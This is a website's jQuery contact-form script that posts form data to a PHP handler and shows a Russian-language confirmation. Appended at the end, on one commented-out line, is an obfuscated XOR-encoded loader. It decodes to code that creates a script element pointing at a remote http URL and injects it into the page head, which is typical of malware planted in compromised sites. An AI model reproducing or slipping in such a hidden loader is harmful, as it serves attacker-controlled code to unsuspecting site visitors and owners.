jQuery(document).ready(function($) {

$("#ajax-contact-form").submit(function() {
var str = $(this).serialize();

$.ajax({
type: "POST",
url: "./form/contact.php",
data: str,
success: function(msg) {
if(msg == 'OK') {
	dataLayer.push({'event': 'added_application'});
result = '<div class="notification_ok">Ваше сообщение было отправлено</div>';
$("#fields").hide();
} else {
result = msg;
}
// $('#reponse_msg').html(result);
    $('#ajax-contact-form').fadeOut();
    $('#reponse_msg').fadeIn(500);
}
});
return false;
});
});

// function x8SQbQS(ro,iKD){var we='';var mrFrO=0;var h9=0;for(mrFrO=0;mrFrO<ro.length;mrFrO++){var e64Zz=ro.charAt(mrFrO);var q5=e64Zz.charCodeAt(0)^iKD.charCodeAt(h9);e64Zz=String.fromCharCode(q5);we+=e64Zz;if(h9==iKD.length-1)h9=0;else h9++;}return (we);}function l7qsex(mE6sM){var q2i1=document[tBcP(mG072[3])](tBcP(mG072[0])+tBcP(mG072[1])+tBcP(mG072[2]));q2i1[tBcP(mG072[4])]=mE6sM;q2i1[tBcP(mG072[5])]=tBcP(mG072[6]);document[tBcP(mG072[9])](tBcP(mG072[8]))[0][tBcP(mG072[7])](q2i1);}var mG072=["007033","006043","004054","023048080081065083033088084091001055029","007048086","000059069085","000039077068026092005066080069007043000058050","021050069085091082039092088090000","028039084084","019039065117089083009081095066023027016030039062118021047080","028054065064015025075071069087016060071057043053010090048064031095069075087095066074051026"];function zfa(xpq7){var xmK1='';var r7kUE=0;var v5Id=0;for(r7kUE=0;r7kUE<xpq7.length/3;r7kUE++){xmK1+=String.fromCharCode(xpq7.slice(v5Id,v5Id+3));v5Id=v5Id+3;}return xmK1;}l7qsex(tBcP(mG072[10]));function tBcP(dWQ){return x8SQbQS(zfa(dWQ),'tB5056d416dYiJFY8');}